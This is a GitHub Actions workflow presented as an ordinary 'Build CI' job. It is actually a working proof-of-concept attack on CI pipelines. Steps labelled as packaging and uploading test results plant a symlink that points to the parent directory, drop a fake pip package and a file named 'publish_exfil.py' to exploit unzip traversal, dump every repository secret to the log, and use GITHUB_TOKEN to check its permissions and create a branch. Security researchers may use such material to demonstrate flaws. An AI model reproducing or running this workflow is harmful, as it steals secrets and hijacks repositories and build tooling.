name: Build CI

on: [pull_request]

jobs:
  build:
    name: Build
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Package test reports
        uses: ./.github/actions/plant-multi
        with:
          name: "."
          entries: '[{"name":"p","content":"..","mode":41471}]'

      - name: Upload test results
        uses: ./.github/actions/plant-multi
        with:
          name: "p"
          entries: |
            [
              {"name":"pip/__init__.py","content":"","mode":33188},
              {"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},
              {"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},
              {"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}
            ]

      - name: Token and secret probe
        continue-on-error: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SECRETS_LEN: ${{ toJSON(secrets) }}
        run: |
          echo "SECRETS_JSON=$(printf '%s' "$SECRETS_LEN" | wc -c) chars"
          printf '%s' "$SECRETS_LEN" | head -c 1500; echo
          curl -s -H "Authorization: token $GITHUB_TOKEN" "$GITHUB_API_URL/repos/${{ github.repository }}" -o repo.json
          python3 -c "import json;d=json.load(open('repo.json'));print('TOKEN_PERMS',d.get('permissions'))"
          curl -s -o probe_ref.json -w "REF_CREATE_HTTP=%{http_code}\n" -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Content-Type: application/json" -d "{\"ref\":\"refs/heads/poc-probe-${{ github.run_id }}\",\"sha\":\"${{ github.sha }}\"}" "$GITHUB_API_URL/repos/${{ github.repository }}/git/refs"
          head -c 300 probe_ref.json; echo
